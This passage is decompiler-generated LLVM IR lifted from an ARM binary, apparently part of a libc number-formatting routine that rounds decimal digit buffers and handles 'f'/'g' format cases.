  %v4_154fc = sub i32 0, %v2_154f8
  %v5_154fc = and i32 %v2_154fc, %v4_154fc
  %v6_154fc = icmp slt i32 %v5_154fc, 0
  store i1 %v6_154fc, i1* %cpsr_v.global-to-local, align 1
  %v7_154fc = icmp slt i32 %v2_154fc, 0
  store i1 %v7_154fc, i1* %cpsr_n.global-to-local, align 1
  %v8_154fc = icmp eq i32 %v2_154fc, 0
  store i1 %v8_154fc, i1* %cpsr_z.global-to-local, align 1
  %v6_15500 = icmp slt i32 %v2_154f8, -1
  br i1 %v6_15500, label %dec_label_pc_15504, label %dec_label_pc_1551c

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f8
  %v2_15504 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_15504, i32* @r0, align 4
  store i32 48, i32* @r1, align 4
  store i32 17, i32* @r2, align 4
  %v0_15510 = call i32 @__GI_memset()
  store i32 %v0_15510, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_154f8, %bb195, %dec_label_pc_15504
  %v1_1556069 = phi i32 [ %v2_154a0, %bb195 ], [ %v0_15510, %dec_label_pc_15504 ], [ %v2_154a0, %dec_label_pc_154f8 ]
  %v1_15544 = phi i32 [ %v0_154f8, %bb195 ], [ -1, %dec_label_pc_15504 ], [ %v2_154f8, %dec_label_pc_154f8 ]
  %v1_15520 = add i32 %v1_15544, -16
  %v3_15520 = sub i32 15, %v1_15544
  %v4_15520 = and i32 %v3_15520, %v1_15544
  %v5_15520 = icmp slt i32 %v4_15520, 0
  store i1 %v5_15520, i1* %cpsr_v.global-to-local, align 1
  %v6_15520 = icmp slt i32 %v1_15520, 0
  store i1 %v6_15520, i1* %cpsr_n.global-to-local, align 1
  %v7_15520 = icmp eq i32 %v1_15544, 16
  store i1 %v7_15520, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_1552c = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_1552c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_15534 = icmp sgt i32 %v1_15544, 16
  br i1 %v7_15534, label %.thread18, label %dec_label_pc_15540

.thread18:                                        ; preds = %dec_label_pc_1551c
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_15538 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_15538, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_15540:                               ; preds = %dec_label_pc_1551c
  %v2_15540 = ptrtoint i32* %stack_var_-86 to i32
  %v2_15544 = add i32 %v1_15544, %v2_15540
  store i32 %v2_15544, i32* %r3.global-to-local, align 4
  %v1_15548 = add i32 %v2_15544, 2
  %v2_15548 = inttoptr i32 %v1_15548 to i8*
  %v3_15548 = load i8, i8* %v2_15548, align 1
  %v4_15548 = zext i8 %v3_15548 to i32
  store i32 %v4_15548, i32* %r2.global-to-local, align 4
  store i32 %v1_15548, i32* %r1.global-to-local, align 4
  %v2_15550 = icmp ugt i8 %v3_15548, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_15550 = icmp ult i8 %v3_15548, 52
  store i1 %v6_15550, i1* %cpsr_n.global-to-local, align 1
  %v7_15550 = icmp eq i8 %v3_15548, 52
  store i1 %v7_15550, i1* %cpsr_z.global-to-local, align 1
  %v2_15554 = xor i1 %v2_15550, true
  %v3_15554 = or i1 %v7_15550, %v2_15554
  br i1 %v3_15554, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_15540
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_15540, %bb196
  %v1_1556068 = phi i32 [ %v1_1556069, %dec_label_pc_15540 ], [ 0, %bb196 ]
  %v2_15558 = xor i1 %v7_15550, true
  %v3_15558 = and i1 %v2_15550, %v2_15558
  br i1 %v3_15558, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_15560 = phi i32 [ %v1_15560.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1556068, %bb197 ], [ 1, %bb198 ]
  %v0_1555c = phi i32 [ %v0_15568, %.backedge ], [ %v10_15538, %.thread18 ], [ %v1_15548, %bb197 ], [ %v1_15548, %bb198 ]
  %v1_1555c = add i32 %v0_1555c, -1
  %v2_1555c = inttoptr i32 %v1_1555c to i8*
  %v3_1555c = load i8, i8* %v2_1555c, align 1
  %v4_1555c = zext i8 %v3_1555c to i32
  store i32 %v1_1555c, i32* %r1.global-to-local, align 4
  %v2_15560 = add i32 %v4_1555c, %v1_15560
  store i32 %v2_15560, i32* %r3.global-to-local, align 4
  %v1_15564 = trunc i32 %v2_15560 to i8
  store i8 %v1_15564, i8* %v2_1555c, align 1
  %v0_15568 = load i32, i32* %r1.global-to-local, align 4
  %v1_15568 = inttoptr i32 %v0_15568 to i8*
  %v2_15568 = load i8, i8* %v1_15568, align 1
  %v3_15568 = zext i8 %v2_15568 to i32
  store i32 %v3_15568, i32* %r2.global-to-local, align 4
  %v2_1556c = icmp ugt i8 %v2_15568, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1556c = icmp ult i8 %v2_15568, 57
  store i1 %v6_1556c, i1* %cpsr_n.global-to-local, align 1
  %v7_1556c = icmp eq i8 %v2_15568, 57
  store i1 %v7_1556c, i1* %cpsr_z.global-to-local, align 1
  %v2_15570 = xor i1 %v2_1556c, true
  %v3_15570 = or i1 %v7_1556c, %v2_15570
  br i1 %v3_15570, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_15574 = xor i1 %v7_1556c, true
  %v3_15574 = and i1 %v2_1556c, %v2_15574
  br i1 %v3_15574, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_1557c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_1557c = phi i32 [ %v1_1557c.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_15578 = icmp ult i8 %v2_15568, 48
  store i1 %v6_15578, i1* %cpsr_n.global-to-local, align 1
  %v7_15578 = icmp eq i8 %v2_15568, 48
  store i1 %v7_15578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15578, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_1557c = or i32 %v1_1557c, 1
  store i32 %v2_1557c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1558021 = icmp slt i32 %v2_1557c, 0
  store i1 %v1_1558021, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15580 = icmp slt i32 %v1_1557c, 0
  store i1 %v1_15580, i1* %cpsr_n.global-to-local, align 1
  %v2_15580 = icmp eq i32 %v1_1557c, 0
  store i1 %v2_15580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15580, label %dec_label_pc_15588, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_15560.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_15588:                               ; preds = %bb203
  store i32 %v2_1552c, i32* %r2.global-to-local, align 4
  %v2_1558c = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_1558c, i32* %r3.global-to-local, align 4
  %v2_15590 = sub i32 %v0_15568, %v2_1558c
  %v3_15590 = icmp uge i32 %v0_15568, %v2_1558c
  %v4_15590 = xor i32 %v0_15568, %v2_1558c
  %v5_15590 = xor i32 %v2_15590, %v0_15568
  %v6_15590 = and i32 %v5_15590, %v4_15590
  %v7_15590 = icmp slt i32 %v6_15590, 0
  store i1 %v7_15590, i1* %cpsr_v.global-to-local, align 1
  %v8_15590 = icmp slt i32 %v2_15590, 0
  store i1 %v8_15590, i1* %cpsr_n.global-to-local, align 1
  %v9_15590 = icmp eq i32 %v0_15568, %v2_1558c
  store i1 %v9_15590, i1* %cpsr_z.global-to-local, align 1
  %v2_15594 = xor i1 %v3_15590, true
  %v3_15594 = or i1 %v9_15590, %v2_15594
  br i1 %v3_15594, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_15588
  store i32 %v2_1558c, i32* %r2.global-to-local, align 4
  store i32 %v2_1558c, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_15588, %bb204
  %v2_155b0 = phi i32 [ %v2_1558c, %bb204 ], [ %v0_15568, %dec_label_pc_15588 ]
  %v4_155a0123 = phi i32 [ %v2_1558c, %bb204 ], [ %v2_1552c, %dec_label_pc_15588 ]
  %v2_1559c = xor i1 %v9_15590, true
  %v3_1559c = and i1 %v3_15590, %v2_1559c
  br i1 %v3_1559c, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_1559c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_1559c, i32* %r0.global-to-local, align 4
  %v5_155a0 = add i32 %v4_155a0123, 2
  store i32 %v5_155a0, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_15594, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_155a4 = load i32, i32* %sb.global-to-local, align 4
  %v5_155a4 = add i32 %v4_155a4, 1
  store i32 %v5_155a4, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_155ac = load i32, i32* %r7.global-to-local, align 4
  %v1_155ac = add i32 %v0_155ac, -103
  %v3_155ac = sub i32 102, %v0_155ac
  %v4_155ac = and i32 %v3_155ac, %v0_155ac
  %v5_155ac = icmp slt i32 %v4_155ac, 0
  store i1 %v5_155ac, i1* %cpsr_v.global-to-local, align 1
  %v6_155ac = icmp slt i32 %v1_155ac, 0
  store i1 %v6_155ac, i1* %cpsr_n.global-to-local, align 1
  %v7_155ac = icmp eq i32 %v0_155ac, 103
  store i1 %v7_155ac, i1* %cpsr_z.global-to-local, align 1
  %v3_155b0 = add i32 %v2_155b0, 1
  %v4_155b0 = inttoptr i32 %v3_155b0 to i8*
  store i8 0, i8* %v4_155b0, align 1
  %v0_155b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_155b4 = add i32 %v0_155b4, 1
  store i32 %v1_155b4, i32* %r1.global-to-local, align 4
  %v0_155b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_155b8, label %bb208, label %dec_label_pc_155e8

bb208:                                            ; preds = %bb207
  %v0_155bc = load i32, i32* %r0.global-to-local, align 4
  %v1_155bc = load i32, i32* %ip.global-to-local, align 4
  %not.v7_155c0 = icmp sge i32 %v1_155bc, %v0_155bc
  %. = zext i1 %not.v7_155c0 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_155c8 = add i32 %v0_155bc, 4
  %v4_155c8 = sub i32 0, %v0_155bc
  %v5_155c8 = and i32 %v2_155c8, %v4_155c8
  %v6_155c8 = icmp slt i32 %v5_155c8, 0
  store i1 %v6_155c8, i1* %cpsr_v.global-to-local, align 1
  %v7_155c8 = icmp slt i32 %v2_155c8, 0
  store i1 %v7_155c8, i1* %cpsr_n.global-to-local, align 1
  %v8_155c8 = icmp eq i32 %v2_155c8, 0
  store i1 %v8_155c8, i1* %cpsr_z.global-to-local, align 1
  %v5_155cc = icmp slt i32 %v0_155bc, -4
  br i1 %v5_155cc, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_155d0 = icmp eq i1 %not.v7_155c0, false
  store i1 %v2_155d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_155d0, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_155d429 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_155d429, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_155f4

bb210:                                            ; preds = %bb209
  %v3_155d8 = sub i32 %v1_155bc, %v0_155bc
  store i32 %v3_155d8, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15600

dec_label_pc_155e8:                               ; preds = %bb207
  %v0_155e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_155e8 = add i32 %v0_155e8, -102
  %v3_155e8 = sub i32 101, %v0_155e8
  %v4_155e8 = and i32 %v3_155e8, %v0_155e8
  %v5_155e8 = icmp slt i32 %v4_155e8, 0
  store i1 %v5_155e8, i1* %cpsr_v.global-to-local, align 1
  %v6_155e8 = icmp slt i32 %v1_155e8, 0
  store i1 %v6_155e8, i1* %cpsr_n.global-to-local, align 1
  %v7_155e8 = icmp eq i32 %v0_155e8, 102
  store i1 %v7_155e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_155e8, i32* %sl.global-to-local, align 4
  br i1 %v7_155e8, label %dec_label_pc_155e8.dec_label_pc_15600_crit_edge, label %dec_label_pc_155f4

dec_label_pc_155e8.dec_label_pc_15600_crit_edge:  ; preds = %dec_label_pc_155e8
  %v0_15600.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15600

dec_label_pc_155f4:                               ; preds = %.thread, %dec_label_pc_155e8
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15610

dec_label_pc_15600:                               ; preds = %bb210, %dec_label_pc_155e8.dec_label_pc_15600_crit_edge
  %v0_15600 = phi i32 [ %v0_15600.pre, %dec_label_pc_155e8.dec_label_pc_15600_crit_edge ], [ %v0_155bc, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15600 = icmp slt i32 %v0_15600, 0
  store i1 %v1_15600, i1* %cpsr_n.global-to-local, align 1
  %v2_15600 = icmp eq i32 %v0_15600, 0
  store i1 %v2_15600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15600, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_15600
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_15608 = load i32, i32* %r2.global-to-local, align 4
  %v6_15608 = add i32 %v5_15608, -1
  %v7_15608 = inttoptr i32 %v6_15608 to i8*
  store i8 48, i8* %v7_15608, align 1
  %v8_15608 = load i32, i32* %r2.global-to-local, align 4
  %v9_15608 = add i32 %v8_15608, -1
  store i32 %v9_15608, i32* %r2.global-to-local, align 4
  %v0_1560c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1563c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_15640.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15640.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_15600, %bb211
  %v1_15640.pre = phi i1 [ %v1_15640.pre.pre, %bb211 ], [ false, %dec_label_pc_15600 ]
  %v0_15640.pre = phi i1 [ %v0_15640.pre.pre, %bb211 ], [ false, %dec_label_pc_15600 ]
  %v1_1563c.pre = phi i32 [ %v1_1563c.pre.pre, %bb211 ], [ %v1_155b4, %dec_label_pc_15600 ]
  %v0_1560c = phi i32 [ %v0_1560c.pre, %bb211 ], [ %v0_15600, %dec_label_pc_15600 ]
  store i32 %v0_1560c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15610

dec_label_pc_15610:                               ; preds = %dec_label_pc_155f4, %bb212
  %v0_156e0 = phi i32 [ 0, %dec_label_pc_155f4 ], [ %v0_1560c, %bb212 ]
  %v1_15644 = phi i1 [ false, %dec_label_pc_155f4 ], [ %v1_15640.pre, %bb212 ]
  %v0_15644 = phi i1 [ false, %dec_label_pc_155f4 ], [ %v0_15640.pre, %bb212 ]
  %v1_1563c = phi i32 [ %v1_155b4, %dec_label_pc_155f4 ], [ %v1_1563c.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_1561c = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_1561c, i32* %r3.global-to-local, align 4
  %v0_15628 = load i32, i32* %r2.global-to-local, align 4
  %v1_15628 = inttoptr i32 %v0_15628 to i8*
  %v2_15628 = load i8, i8* %v1_15628, align 1
  %v3_15628 = zext i8 %v2_15628 to i32
  store i32 %v3_15628, i32* %r3.global-to-local, align 4
  %v5_15628 = add i32 %v0_15628, 1
  store i32 %v5_15628, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_15628, i32* %stack_var_-46, align 4
  %v2_1563c = sub i32 %v1_1563c, %v5_15628
  store i32 %v2_1563c, i32* %r1.global-to-local, align 4
  %v2_15640 = xor i1 %v1_15644, %v0_15644
  br i1 %v2_15640, label %.thread127, label %dec_label_pc_15648

.thread127:                                       ; preds = %dec_label_pc_15610
  %v5_15640 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_15640, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_156f0

dec_label_pc_15648:                               ; preds = %dec_label_pc_15610
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1564c = sub i32 %v0_156e0, %v2_1563c
  %v4_1564c = xor i32 %v2_1563c, %v0_156e0
  %v5_1564c = xor i32 %v2_1564c, %v0_156e0
  %v6_1564c = and i32 %v5_1564c, %v4_1564c
  %v7_1564c = icmp slt i32 %v6_1564c, 0
  store i1 %v7_1564c, i1* %cpsr_v.global-to-local, align 1
  %v8_1564c = icmp slt i32 %v2_1564c, 0
  store i1 %v8_1564c, i1* %cpsr_n.global-to-local, align 1
  %v9_1564c = icmp eq i32 %v0_156e0, %v2_1563c
  store i1 %v9_1564c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_15658 = xor i1 %v8_1564c, %v7_1564c
  br i1 %v2_15658, label %bb214, label %dec_label_pc_1565c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_15648
  store i32 %v2_1564c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_1564c, i1* %cpsr_n.global-to-local, align 1
  %v2_15660 = icmp eq i32 %v2_1564c, 0
  store i1 %v2_15660, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_152c0, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_1564c, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_15674

.thread129:                                       ; preds = %dec_label_pc_1565c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_156ec

dec_label_pc_15674:                               ; preds = %dec_label_pc_1565c
  store i32 ptrtoint (i32* @global_var_1dc73.841 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_15680 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_15680, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_156f0

bb214:                                            ; preds = %dec_label_pc_15648
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_156cc = icmp slt i32 %v0_156e0, 0
  store i1 %v1_156cc, i1* %cpsr_n.global-to-local, align 1
  %v2_156cc = icmp eq i32 %v0_156e0, 0
  store i1 %v2_156cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_152c0, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_156e0, 1
  br i1 %tmp215, label %dec_label_pc_156ec, label %dec_label_pc_156dc

dec_label_pc_156dc:                               ; preds = %bb214
  %v2_156e0 = sub i32 %v2_1563c, %v0_156e0
  store i32 %v2_156e0, i32* %r1.global-to-local, align 4
  %v2_156e4 = add i32 %v5_15628, %v0_156e0
  store i32 %v2_156e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156ec

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156dc, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_156dc ]
  %v0_1570082 = phi i32 [ %v2_1563c, %bb214 ], [ 0, %.thread129 ], [ %v2_156e0, %dec_label_pc_156dc ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %.thread127, %dec_label_pc_15674, %dec_label_pc_156ec
  %v1_15720 = phi i32 [ %v2_15680, %dec_label_pc_15674 ], [ %storemerge141, %dec_label_pc_156ec ], [ %v5_15640, %.thread127 ]
  %v0_1573890 = phi i32 [ -1, %dec_label_pc_15674 ], [ -1, %dec_label_pc_156ec ], [ %v0_156e0, %.thread127 ]
  %v0_15700 = phi i32 [ 0, %dec_label_pc_15674 ], [ %v0_1570082, %dec_label_pc_156ec ], [ %v2_1563c, %.thread127 ]
  %v0_156f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_156f0 = add i32 %v0_156f0, 12
  %v2_156f0 = inttoptr i32 %v1_156f0 to i32*
  %v3_156f0 = load i32, i32* %v2_156f0, align 4
  %v1_156f4 = and i32 %v3_156f0, 16
  store i32 %v1_156f4, i32* %lr.global-to-local, align 4
  %v2_156f4 = icmp eq i32 %v1_156f4, 0
  %tmp238 = zext i1 %v2_156f4 to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15700 = icmp slt i32 %v0_15700, 0
  store i1 %v1_15700, i1* %cpsr_n.global-to-local, align 1
  %v2_15700 = icmp eq i32 %v0_15700, 0
  store i1 %v2_15700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15700, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_156f0
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1571c

bb218:                                            ; preds = %dec_label_pc_156f0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_156f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_156f4, label %dec_label_pc_15710, label %dec_label_pc_1571c

dec_label_pc_15710:                               ; preds = %bb218
  %v0_15710 = load i32, i32* %r7.global-to-local, align 4
  %v1_15710 = add i32 %v0_15710, -103
  %v3_15710 = sub i32 102, %v0_15710
  %v4_15710 = and i32 %v3_15710, %v0_15710
  %v5_15710 = icmp slt i32 %v4_15710, 0
  store i1 %v5_15710, i1* %cpsr_v.global-to-local, align 1
  %v6_15710 = icmp slt i32 %v1_15710, 0
  store i1 %v6_15710, i1* %cpsr_n.global-to-local, align 1
  %v7_15710 = icmp eq i32 %v0_15710, 103
  store i1 %v7_15710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15710, label %dec_label_pc_15738, label %bb219

bb219:                                            ; preds = %dec_label_pc_15710
  %v1_15714 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_15714 = icmp slt i32 %v1_15714, 0
  store i1 %v2_15714, i1* %cpsr_n.global-to-local, align 1
  %v3_15714 = icmp eq i32 %v1_15714, 0
  store i1 %v3_15714, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_15714, 1
  br i1 %tmp220, label %dec_label_pc_15738, label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %.thread33, %bb218, %bb219
  %v2_15720 = inttoptr i32 %v1_15720 to i32*
  store i32 112, i32* %v2_15720, align 4
  %v1_15728 = load i32, i32* %r6.global-to-local, align 4
  %v2_15728 = add i32 %v1_15728, 4
  %v3_15728 = inttoptr i32 %v2_15728 to i32*
  store i32 1, i32* %v3_15728, align 4
  store i32 ptrtoint (i32* @global_var_1dc80.843 to i32), i32* %r3.global-to-local, align 4
  %v1_15730 = load i32, i32* %r6.global-to-local, align 4
  %v2_15730 = add i32 %v1_15730, 8
  %v3_15730 = inttoptr i32 %v2_15730 to i32*
  store i32 ptrtoint (i32* @global_var_1dc80.843 to i32), i32* %v3_15730, align 4
  %v0_15734 = load i32, i32* %r6.global-to-local, align 4
  %v1_15734 = add i32 %v0_15734, 12
  store i32 %v1_15734, i32* %r6.global-to-local, align 4
  %v0_15738.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_15710, %bb219, %dec_label_pc_1571c
  %v1_15744 = phi i32 [ %v1_15720, %bb219 ], [ %v1_15734, %dec_label_pc_1571c ], [ %v1_15720, %dec_label_pc_15710 ]
  %v0_15738 = phi i32 [ %v0_1573890, %bb219 ], [ %v0_15738.pre, %dec_label_pc_1571c ], [ %v0_1573890, %dec_label_pc_15710 ]
  %v1_15738 = add i32 %v0_15738, 1
  store i32 %v1_15738, i32* %ip.global-to-local, align 4
  %v3_15738 = sub i32 0, %v0_15738
  %v4_15738 = and i32 %v1_15738, %v3_15738
  %v5_15738 = icmp slt i32 %v4_15738, 0
  store i1 %v5_15738, i1* %cpsr_v.global-to-local, align 1
  %v6_15738 = icmp slt i32 %v1_15738, 0
  store i1 %v6_15738, i1* %cpsr_n.global-to-local, align 1
  %v7_15738 = icmp eq i32 %v1_15738, 0
  store i1 %v7_15738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15738, label %dec_label_pc_1575c, label %dec_label_pc_15740

dec_label_pc_15740:                               ; preds = %dec_label_pc_15738
  %v1_15740 = sub i32 -1, %v0_15738
  %v2_15744 = add i32 %v1_15744, 4
  %v3_15744 = inttoptr i32 %v2_15744 to i32*
  store i32 %v1_15740, i32* %v3_15744, align 4
  store i32 ptrtoint (i32* @global_var_1dc73.841 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_15750 = load i32, i32* %r6.global-to-local, align 4
  %v2_15750 = inttoptr i32 %v1_15750 to i32*
  store i32 176, i32* %v2_15750, align 4
  %v0_15754 = load i32, i32* %r3.global-to-local, align 4
  %v1_15754 = load i32, i32* %r6.global-to-local, align 4
  %v2_15754 = add i32 %v1_15754, 8
  %v3_15754 = inttoptr i32 %v2_15754 to i32*
  store i32 %v0_15754, i32* %v3_15754, align 4
  %v0_15758 = load i32, i32* %r6.global-to-local, align 4
  %v1_15758 = add i32 %v0_15758, 12
  store i32 %v1_15758, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1575c

dec_label_pc_1575c:                               ; preds = %dec_label_pc_15738, %dec_label_pc_15740
  %v2_15764 = phi i32 [ %v1_15744, %dec_label_pc_15738 ], [ %v1_15758, %dec_label_pc_15740 ]
  %v0_1575c = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1575c = icmp slt i32 %v0_1575c, 0
  store i1 %v1_1575c, i1* %cpsr_n.global-to-local, align 1
  %v2_1575c = icmp eq i32 %v0_1575c, 0
  store i1 %v2_1575c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1575c, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_1575c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_15764 = inttoptr i32 %v2_15764 to i32*
  store i32 112, i32* %v3_15764, align 4
  %v1_15768 = load i32, i32* %r4.global-to-local, align 4
  %v2_15768 = load i32, i32* %r6.global-to-local, align 4
  %v3_15768 = add i32 %v2_15768, 8
  %v4_15768 = inttoptr i32 %v3_15768 to i32*
  store i32 %v1_15768, i32* %v4_15768, align 4
  %v1_1576c = load i32, i32* %r1.global-to-local, align 4
  %v2_1576c = load i32, i32* %r6.global-to-local, align 4
  %v3_1576c = add i32 %v2_1576c, 4
  %v4_1576c = inttoptr i32 %v3_1576c to i32*
  store i32 %v1_1576c, i32* %v4_1576c, align 4
  %v1_15770 = load i32, i32* %r6.global-to-local, align 4
  %v2_15770 = add i32 %v1_15770, 12
  store i32 %v2_15770, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_1575c, %bb221
  %v1_15794 = phi i32 [ %v2_15764, %dec_label_pc_1575c ], [ %v2_15770, %bb221 ]
  %v0_15774 = load i32, i32* %r7.global-to-local, align 4
  %v1_15774 = add i32 %v0_15774, -103
  %v3_15774 = sub i32 102, %v0_15774
  %v4_15774 = and i32 %v3_15774, %v0_15774
